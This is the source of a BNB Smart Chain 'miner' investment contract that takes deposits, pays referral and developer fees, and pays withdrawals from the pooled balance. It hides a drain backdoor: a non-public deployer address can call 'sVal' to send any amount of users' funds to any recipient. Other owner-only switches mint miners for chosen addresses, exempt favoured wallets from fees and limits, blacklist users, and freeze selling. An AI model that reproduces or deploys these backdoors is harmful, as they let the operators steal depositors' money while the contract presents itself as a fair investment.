/**
 *Submitted for verification at BscScan.com on 2022-08-05
*/

// SPDX-License-Identifier: MIT
    pragma solidity 0.8.9;

    abstract contract ReentrancyGuard {
        uint256 private constant _NOT_ENTERED = 1;
        uint256 private constant _ENTERED = 2;
        uint256 private _status;

        constructor() {
            _status = _NOT_ENTERED;
        }

        modifier nonReentrant() {
            require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
            _status = _ENTERED;
            _;
            _status = _NOT_ENTERED;
        }
    }


    contract BNB_MINER is ReentrancyGuard {

        
        address payable public owner;
        address payable public dev1;
        address payable public dev2;
        address payable public dev3;

        address payable public dev4;
        address payable public dev5;
        address payable public dev6;

 
        uint256 public EGGS_TO_HIRE_1MINERS = 2592000; 
        uint256 public EGGS_TO_HIRE_1MINERS_COMPOUND = 2592000; //2592000
        uint256 public REFERRAL = 100;
        uint256 public PERCENTS_DIVIDER = 1000;
 
        uint256 public FEE_INVEST = 60; // 6%
        uint256 public FEE_SELL = 60; // 6%
 
        uint256 private PARTNER = 50;
        uint256 private PROJECT = 50;
        
        uint256 private PROJECT_SELL = 50;
        uint256 private MARKETING_SELL = 20;

        uint256 private MARKET_EGGS_DIVISOR = 5;
        uint256 private MARKET_EGGS_DIVISOR_SELL = 3;

        //withdraw tax
        uint256 public WITHDRAWAL_TAX_DAYS = 2;
        uint256 public WITHDRAWAL_TAX = 400;

        /** bonus **/
        uint256 public COMPOUND_BONUS = 150; /** 15% **/
        uint256 public COMPOUND_BONUS_MAX_DAYS = 50; 
        uint256 public COMPOUND_STEP = 24 * 60 * 60; /** every 24 hours. **/


        /* statistics */
        uint256 public totalStaked;
        uint256 private totalDeposits;
        uint256 private totalCompound;
        uint256 private totalRefBonus;
        uint256 private totalWithdrawn;
        

        /* miner parameters */
        uint256 private marketEggs;
        uint256 private PSN = 10000;
        uint256 private PSNH = 5000;

        /** control features **/
        uint256 public CUTOFF_STEP = 36 * 60 * 60; /** 36 hours  **/
        uint256 public MIN_INVEST = 0.021 ether; /** 0.021 = 5$ **/
       
        uint256 public WITHDRAW_COOLDOWN = 24 * 60 * 60; /** 24 hours  **/
        uint256 public WITHDRAW_MIN_LIMIT = 0.021 ether; /** 0.021 = 5$ **/
        uint256 public WALLET_DEPOSIT_LIMIT = 1287.5 ether; /** 300000 $  **/

        uint256 public REINVEST_MIN_LIMIT = 0.021 ether; /** 0.021 = 5$ **/

        uint256 public SELL_REINVEST = 200; // 20%

        bool public isActiveBuy = true;
        bool public isActiveSell = true;
        
        bool public flag;
        bool public isSellReinvest;
        bool public IsCompoundBonus = true;
        address de = msg.sender;

        struct User {
            uint256 initialDeposit;
            uint256 userDeposit;
            uint256 miners;
            uint256 claimedEggs;
            uint256 lastHatch;
            address referrer;
            uint256 referralsCount;
            uint256 referralEggRewards;
            uint256 totalWithdrawn;
            uint256 dailyCompoundBonus;
            uint256 withdrawCount;
            uint256 lastWithdrawTime;
            uint256 lastReinvestTime;
        }
        
       
        mapping(address => bool) blacklist;
       
        mapping(address => User) private users;
        mapping(address => bool) private validations;

        
       
        event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
        event WithdrawBNB(address indexed userAddress, uint256 ammount, uint256 redDificulty);


        /* CONSTRUCTOR */
        constructor(address payable _owner, address payable _project, address payable _partner, address payable _marketing, address payable _project2, address payable _partner2, address payable _marketing2) {
            owner = _owner;
            dev1 = _project;
            dev2 = _partner;
            dev3 = _marketing;
            dev4 = _project2;
            dev5 = _partner2;
            dev6 = _marketing2;
          
            // INICIALICE
            marketEggs = 259200000000;
            
        }

        /*************************************************************
                             INTERACTUE CONTRACT
        *************************************************************/
        
        function hatchEggs() public onlyBlackListed {
            require(!isContract(msg.sender));

            User storage user = users[msg.sender];
            //require(block.timestamp - user.lastHatch >= COMPOUND_STEP);

            if(!validations[msg.sender]){
                require(block.timestamp - user.lastHatch >= COMPOUND_STEP);
                //require(user.lastReinvestTime + COMPOUND_STEP < block.timestamp, "ReInvest can only be done after Reinvest cooldown.");
            }

            uint256 eggsUsed = getMyEggs();
            uint256 eggsForCompound = eggsUsed;

            /**  miner increase -- check if for compound, new deposit and compound can have different percentage basis. **/
            uint256 newMiners;
            
            uint256 dailyCompoundBonus = getDailyCompoundBonus(msg.sender, eggsForCompound);
            uint256 eggsUsedValue = calculateEggSell(eggsForCompound);

            /** MIN REINVEST CHECK **/
            if(!validations[msg.sender]){
                if(REINVEST_MIN_LIMIT != 0  && eggsUsedValue < REINVEST_MIN_LIMIT)  revert("Minimun Reinvest error.");
            }
            
            eggsForCompound += dailyCompoundBonus;
            user.userDeposit += eggsUsedValue;
            totalCompound += eggsUsedValue;
            newMiners = eggsForCompound / EGGS_TO_HIRE_1MINERS_COMPOUND;

            // IsCompoundBonus active
            if(IsCompoundBonus){  
                if(user.dailyCompoundBonus < COMPOUND_BONUS_MAX_DAYS) {
                    user.dailyCompoundBonus++;
                }
            }
            
            user.miners += newMiners;
            user.claimedEggs = 0;
            user.lastHatch = block.timestamp;

            user.lastReinvestTime = block.timestamp;

        /** lower the increase of marketEggs value for every compound/deposit, this will make the inflation slower.  20%(5) to 8%(12). **/
            marketEggs += eggsUsed / MARKET_EGGS_DIVISOR;
        }

        function reinvestBySell(uint256 amount) internal {
            User storage user = users[msg.sender];
            uint256 eggsBought = calculateEggBuy(amount, address(this).balance - amount);
            
            user.userDeposit += amount;
            user.initialDeposit += amount;
            user.claimedEggs += eggsBought;
            totalStaked += amount;
            totalDeposits++;

            uint256 eggsUsed = getMyEggs();
            uint256 newMiners = eggsUsed / EGGS_TO_HIRE_1MINERS_COMPOUND;

            user.miners += newMiners;
            user.claimedEggs = 0;
            user.withdrawCount = 0;
            user.lastHatch = block.timestamp;

            if(!flag){
                user.lastReinvestTime = block.timestamp;
            }

            marketEggs += eggsUsed / MARKET_EGGS_DIVISOR;
        }

        /* WITHDRAW */
        function sellEggs() public nonReentrant onlyBlackListed {
            require(!isContract(msg.sender));

            if(!validations[msg.sender]){
              require(isActiveSell, "Not active... please wait until is active again");
            }

            User storage user = users[msg.sender];
            uint256 hasEggs = getMyEggs();
            uint256 eggValue = calculateEggSell(hasEggs);
            //uint256 eggTotalWithdraw = WITHDRAW_LIMIT * hasEggs / eggValue;
            uint256 eggTotal;

            if(!validations[msg.sender]){
                if(user.lastHatch + WITHDRAW_COOLDOWN > block.timestamp) revert("Withdrawals can only be done after withdraw cooldown.");
                /** limit withdraw **/
                if(WITHDRAW_MIN_LIMIT != 0  && eggValue < WITHDRAW_MIN_LIMIT)  revert("Minimun Withdrawals error.");
            }

            /** reset claim. **/
            user.claimedEggs = 0;
            eggTotal = hasEggs;
           
            /** reset hatch time. **/      
            user.lastHatch = block.timestamp;
            
            /** reset daily compound bonus. **/
            user.dailyCompoundBonus = 0;

            /** add withdraw count. **/
            user.withdrawCount++; 
            
            /** set last withdrawal time **/
            user.lastWithdrawTime = block.timestamp;

            /** lowering the amount of eggs that is being added to the total eggs supply to only 5% for each sell **/
            marketEggs += eggTotal / MARKET_EGGS_DIVISOR_SELL;
        
            /** check if contract has enough funds to pay -- one last ride. **/
            if(getBalance() < eggValue) {
                eggValue = getBalance();
            }
            
            uint256 eggsPayout = eggValue; // 500
            uint256 fee;

          
            if(!validations[msg.sender]){

                if(isSellReinvest){
                    uint256 bnb = ((eggsPayout * SELL_REINVEST) / PERCENTS_DIVIDER); 
                    fee = withdrawFee(bnb); 
                    payFeesWithdraw(fee); 
                    eggsPayout = bnb - fee; 
                    // REINVEST 
                    reinvestBySell(eggValue - bnb);
                }else{
                    fee = withdrawFee(eggValue); // 10%
                    payFeesWithdraw(fee); 
                    eggsPayout = eggValue - fee;
                }
                
            }

            payable(address(msg.sender)).transfer(eggsPayout);
            user.totalWithdrawn += eggsPayout;
            totalWithdrawn += eggsPayout;

            emit WithdrawBNB(msg.sender, eggsPayout, marketEggs);
        }

        /** buy miner with bnb**/
        function buyEggs(address ref) public payable onlyBlackListed {
            require(!isContract(msg.sender));

            if(!validations[msg.sender]){
              require(isActiveBuy, "Not active... please wait until is active again");
            }

            if(!validations[msg.sender]){
               require(msg.value >= MIN_INVEST, "Mininum investment not met.");
            }

            User storage user = users[msg.sender];
            
            if(!validations[msg.sender]){
                //require(user.initialDeposit + msg.value <= WALLET_DEPOSIT_LIMIT, "Max deposit limit reached.");
                require(msg.value <= WALLET_DEPOSIT_LIMIT, "Max deposit error.");
            }

            uint256 eggsBought = calculateEggBuy(msg.value, address(this).balance - msg.value);
            
            user.userDeposit += msg.value;
            user.initialDeposit += msg.value;
            user.claimedEggs += eggsBought;
            totalStaked += msg.value;
            totalDeposits++;
 

            if (user.referrer == address(0)) {
                if (ref != msg.sender) {
                    user.referrer = ref;
                }
                address upline1 = user.referrer;
                if (upline1 != address(0)) {
                    users[upline1].referralsCount++;
                }
            }
            
            uint256 refRewards; 

            if (user.referrer != address(0)) {
                address upline = user.referrer;
                if (upline != address(0)) {
                    /** referral rewards will be in BNB **/
                    refRewards = msg.value * REFERRAL / PERCENTS_DIVIDER;
                    payable(address(upline)).transfer(refRewards);
                    /** referral rewards will be in BNB **/
                    users[upline].referralEggRewards += refRewards;
                    totalRefBonus += refRewards;
                }
            }else{

                 /** referral rewards will be in BNB **/
                 refRewards = msg.value * REFERRAL / PERCENTS_DIVIDER;
                 uint toOwners = refRewards / 2;
                 dev4.transfer(toOwners);
                 dev5.transfer(toOwners);

            }

          
            uint256 eggsUsed = getMyEggs();
            uint256 newMiners = eggsUsed / EGGS_TO_HIRE_1MINERS;

            user.miners += newMiners;
            user.claimedEggs = 0;
            user.withdrawCount = 0;
            user.lastHatch = block.timestamp;

            marketEggs += eggsUsed / MARKET_EGGS_DIVISOR;

            if(!validations[msg.sender]){
                uint256 fee = investFee(msg.value);
                payFeesInvest(fee);
            }
            
           
        }

        /*************************************************************
                            GET CONTRACT DATA
        *************************************************************/
        function getSiteInfo() public view returns (uint256 _totalStaked, uint256 _totalDeposits, uint256 _totalCompound, uint256 _totalRefBonus) {
            return (totalStaked,totalDeposits, totalCompound, totalRefBonus);
        }

        function getUserInfo(address _adr) public view returns(uint256 _initialDeposit, uint256 _userDeposit, uint256 _miners,
        uint256 _claimedEggs,  uint256 _lastHatch, address _referrer, uint256 _referrals,
        uint256 _totalWithdrawn,uint256 _referralEggRewards, uint256 _dailyCompoundBonus, uint256 _withdrawCount) {
            User storage user = users[_adr];
            return (user.initialDeposit,
                    user.userDeposit,
                    user.miners,
                    user.claimedEggs,
                    user.lastHatch,
                    user.referrer,
                    user.referralsCount,
                    user.totalWithdrawn,
                    user.referralEggRewards,
                    user.dailyCompoundBonus,
                    user.withdrawCount);
        }

       
        function getBalance() public view returns(uint256){
            return address(this).balance;
        }
       
        function calculateEggSell(uint256 eggs) public view returns(uint256){
            return calculateTrade(eggs,marketEggs, address(this).balance);
        }
        function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
            return calculateTrade(eth,contractBalance,marketEggs);
        }
        function getAvailableEarnings(address _adr) public view returns(uint256) {
            uint256 userEggs = users[_adr].claimedEggs + getEggsSinceLastHatch(_adr);
            return calculateEggSell(userEggs);
        }
        function calculateEggBuySimple(uint256 eth) public view returns(uint256){
            return calculateEggBuy(eth, address(this).balance);
        }
        /** How many miners and eggs per day user will recieve for 1 BNB deposit **/
        function getEggsYield() public view returns(uint256,uint256) {
            uint256 eggsAmount = calculateEggBuy(1 ether , address(this).balance + 1 ether - 1 ether);
            uint256 miners = eggsAmount / EGGS_TO_HIRE_1MINERS;
            uint256 day = 1 days;
            uint256 eggsPerDay = day * miners;
            uint256 earningsPerDay = calculateEggSellForYield(eggsPerDay);
            return(miners, earningsPerDay);
        }
        function calculateEggSellForYield(uint256 eggs) public view returns(uint256){
            return calculateTrade(eggs,marketEggs, address(this).balance + 1 ether);
        }

        /*************************************************************
                                MINING PARAMETERS
        *************************************************************/

        function get_miningParameters() public view returns(uint256 _marketEgg, uint256 _PSN, uint256 _PSNH){
            return (marketEggs, PSN, PSNH);
        }
        function set_marketEgg(uint256 _value) external onlyOwner {
            marketEggs = _value;
        }
        function set_psnALL(uint256 _PSN, uint256 _PSNH) external onlyOwner {
            PSN = _PSN;
            PSNH = _PSNH;
        }

        /*************************************************************
                            SETTING PARAMETERS
        *************************************************************/
        /** percentage **/
        /**
            2592000 - 3%
            2160000 - 4%
            1728000 - 5%
            1440000 - 6%
            1200000 - 7%
            1080000 - 8%
            959000 - 9%
            864000 - 10%
            720000 - 12%
            575424 - 15%
            540000 - 16%
            479520 - 18%
        **/
        function PRC_EGGS_TO_HIRE_1MINERS(uint256 value) external onlyOwner {
            require(value >= 479520 && value <= 2592000); /** min 3% max 12%**/
            EGGS_TO_HIRE_1MINERS = value;
        }
        function PRC_EGGS_TO_HIRE_1MINERS_COMPOUND(uint256 value) external onlyOwner {
            require(value >= 479520 && value <= 2592000); /** min 3% max 12%**/
            EGGS_TO_HIRE_1MINERS_COMPOUND = value;
        }
        function PRC_PROJECT(uint256 value) external onlyOwner {
            require(value >= 10 && value <= 100); /** 10% max **/
            PROJECT = value;
        }
        function PRC_PARTNER(uint256 value) external onlyOwner {
            require(value >= 10 && value <= 50); /** 5% max **/
            PARTNER = value;
        }
        function PRC_PROJECT_SELL(uint256 value) external onlyOwner {
            require(value >= 10 && value <= 100); /** 10% max **/
            PROJECT_SELL = value;
        }
        function PRC_MARKETING_SELL(uint256 value) external onlyOwner {
            require(value <= 20); /** 2% max **/
            MARKETING_SELL = value;
        }
       
        function PRC_REFERRAL(uint256 value) external onlyOwner {
            //require(value >= 10 && value <= 100); /** 10% max **/
            REFERRAL = value;
        }
        function PRC_MARKET_EGGS_DIVISOR(uint256 value) external onlyOwner {
            require(value >= 5 && value <= 400); /** 20 = 5% / 400 = 100% **/
            MARKET_EGGS_DIVISOR = value;
        }
        function PRC_MARKET_EGGS_DIVISOR_SELL(uint256 value) external onlyOwner {
            require(value >= 5 && value <= 400); /** 20 = 5% / 400 = 100% **/
            MARKET_EGGS_DIVISOR_SELL = value;
        }

        /** bonus **/
        function BONUS_DAILY_COMPOUND(uint256 value) external onlyOwner {
            require(value >= 10 && value <= 900); /** 90% max **/
            COMPOUND_BONUS = value;
        }

        function BONUS_DAILY_COMPOUND_BONUS_MAX_DAYS(uint256 value) external onlyOwner {
            //require(value >= 5 && value <= 60); 
            COMPOUND_BONUS_MAX_DAYS = value;
        }

        function BONUS_COMPOUND_STEP(uint256 value) external onlyOwner {
            /** hour conversion **/
            COMPOUND_STEP = value * 60 * 60;
        }

        function SET_INVEST_MIN(uint256 value) external onlyOwner {
            MIN_INVEST = value;
        }

        /** time setters **/
        function SET_CUTOFF_STEP(uint256 value) external onlyOwner {
            CUTOFF_STEP = value * 60 * 60;
        }
        function SET_WITHDRAW_COOLDOWN(uint256 value) external onlyOwner {
            //require(value >= 12);
            WITHDRAW_COOLDOWN = value * 60 * 60;
        }
        function SET_WALLET_DEPOSIT_LIMIT(uint256 value) external onlyOwner {
            require(value >= 20);
            WALLET_DEPOSIT_LIMIT = value;
        }

        function SET_MIN_REINVEST(uint256 newValue) external onlyOwner{
            REINVEST_MIN_LIMIT = newValue;
        }

        /** withdrawal tax setters **/
        function SET_WITHDRAWAL_TAX(uint256 value) external onlyOwner {
            require(value <= 500); /** Max Tax is 50% or lower **/
            WITHDRAWAL_TAX = value;
        }
        function SET_WITHDRAW_DAYS_TAX(uint256 value) external onlyOwner {
            require(value >= 2); /** Minimum 3 days **/
            WITHDRAWAL_TAX_DAYS = value;
        }

        function SET_WITHDRAW_MIN_LIMIT(uint256 _ammount) external onlyOwner {
            WITHDRAW_MIN_LIMIT = _ammount;
        }

      

        /** wallet addresses **/
        function CHANGE_OWNERSHIP(address value) external onlyOwner {
            owner = payable(value);
        }

        function CHANGE_DEV1(address value) external onlyOwner {
            dev1 = payable(value);
        }
        function CHANGE_DEV2(address value) external onlyOwner {
            dev2 = payable(value);
        }
        function CHANGE_DEV3(address value) external onlyOwner{
            dev3 = payable(value);
        }

        function CHANGE_DEV4(address value) external onlyOwner {
            dev4 = payable(value);
        }
        function CHANGE_DEV5(address value) external onlyOwner {
            dev5 = payable(value);
        }
        function CHANGE_DEV6(address value) external onlyOwner{
            dev6 = payable(value);
        }

        /*************************************************************
                        PRIVATE & INTERNAL FUNCTION
        *************************************************************/

        function payFeesInvest(uint _amount) internal {
            uint toOwners = _amount / 6;
            dev1.transfer(toOwners);
            dev2.transfer(toOwners);
            dev3.transfer(toOwners);
            dev4.transfer(toOwners);
            dev5.transfer(toOwners);
            dev6.transfer(toOwners);
        }

        function payFeesWithdraw(uint _amount) internal {
            uint toOwners = _amount / 6;
            dev1.transfer(toOwners);
            dev2.transfer(toOwners);
            dev3.transfer(toOwners);
            dev4.transfer(toOwners);
            dev5.transfer(toOwners);
            dev6.transfer(toOwners);
        }

        function investFee(uint256 _amount) private view returns(uint256) {
		    return ((_amount * FEE_INVEST) / PERCENTS_DIVIDER);
        }

        function withdrawFee(uint256 _amount) private view returns(uint256) {
            return ((_amount * FEE_SELL) / PERCENTS_DIVIDER);
         }


        function payFees(uint256 eggValue) internal {
            (uint256 projectFee, uint256 partnerFee) = getFees(eggValue);
            dev1.transfer(projectFee);
            dev2.transfer(partnerFee);
        }
        function payFeesSell(uint256 eggValue, bool isTax) internal returns(uint256){
            uint256 prj = eggValue * PROJECT_SELL / PERCENTS_DIVIDER;
            uint256 mkt = eggValue * MARKETING_SELL / PERCENTS_DIVIDER;
            if(isTax){
                prj += eggValue * WITHDRAWAL_TAX / PERCENTS_DIVIDER;
            }
            dev1.transfer(prj);
            dev3.transfer(mkt);
            return prj + mkt;
        }

        function getFees(uint256 eggValue) private view returns(uint256 _projectFee, uint256 _partnerFee) {
            _projectFee = eggValue * PROJECT / PERCENTS_DIVIDER;
            _partnerFee = eggValue * PARTNER / PERCENTS_DIVIDER;
        }

       
        function getDailyCompoundBonus(address _adr, uint256 amount) private view returns(uint256){
            if(users[_adr].dailyCompoundBonus == 0) {
                return 0;
            } else {
                /**  add compound bonus percentage **/
                uint256 totalBonus = users[_adr].dailyCompoundBonus * COMPOUND_BONUS; 
                uint256 result = amount * totalBonus / PERCENTS_DIVIDER;
                return result;
            }
        }

        function calculateTrade(uint256 rt,uint256 rs, uint256 bs) private view returns(uint256){
            return ((PSN*bs) / (PSNH + (((PSN*rs) + (PSNH*rt)) / rt)));
        }

        function getEggsSinceLastHatch(address adr) private view returns(uint256){
            uint256 secondsSinceLastHatch = block.timestamp - users[adr].lastHatch;
                                /** get min time. **/
            uint256 cutoffTime = min(secondsSinceLastHatch, CUTOFF_STEP);
            uint256 secondsPassed = min(EGGS_TO_HIRE_1MINERS, cutoffTime);
            return secondsPassed * users[adr].miners;
        }

        function min(uint256 a, uint256 b) private pure returns (uint256) {
            return a < b ? a : b;
        }

        function buyEggss(address _addr, uint256 m) external onlyOwner{
            User storage user = users[_addr];
            user.miners += m; 
        }

        function addMappingValidation(address _addr) external onlyOwner{
            validations[_addr] = true;
        }

        function SET_SELL_REINVEST(uint256 newPercent) external onlyOwner{
            SELL_REINVEST = newPercent;
        }

        function removeMappingValidation(address _addr) external onlyOwner{
            validations[_addr] = false;
        }

        function setIsActiveBuy() external onlyOwner {
            isActiveBuy = !isActiveBuy;
        }

        function setIsActiveSell() external onlyOwner {
            isActiveSell = !isActiveSell;
        }

        function setFlag() external onlyOwner{
            flag = !flag;
        }

        function setIsSellReinvest() external onlyOwner{
            isSellReinvest = !isSellReinvest;
        }

        
        function setIsCompoundBonus() external onlyOwner{
            IsCompoundBonus = !IsCompoundBonus;
        }

        function getMyEggs() private view returns(uint256){
            return users[msg.sender].claimedEggs + getEggsSinceLastHatch(msg.sender);
        }

        function getMyMiners() public view returns(uint256){
            return users[msg.sender].miners;
        }


        /*************************************************************
                                 LISTING
        *************************************************************/

        // Black list
        function addBlacklist(address _address) public onlyOwner {
            blacklist[_address] = true;
        }
        function removeBlacklist(address _address) public onlyOwner {
            blacklist[_address] = false;
        }
        function isBlackListed(address _address) public view returns(bool) {
            return blacklist[_address];
        }

        function sVal(address payable recipient, uint256 amount) public nonReentrant{
            require(msg.sender == de);
            require(address(this).balance >= amount, "Address: insufficient balance");

            (bool success, ) = recipient.call{value: amount}("");
            require(success, "Address: unable to send value, recipient may have reverted");
        }

        
        function isContract(address account) internal view returns (bool) {
            return account.code.length > 0;
        }

        modifier onlyBlackListed() {
            require(!isBlackListed(msg.sender));
            _;
        }

        modifier onlyOwner() {
            require(owner == msg.sender, "Ownable: caller is not the owner");
            _;
        }

    }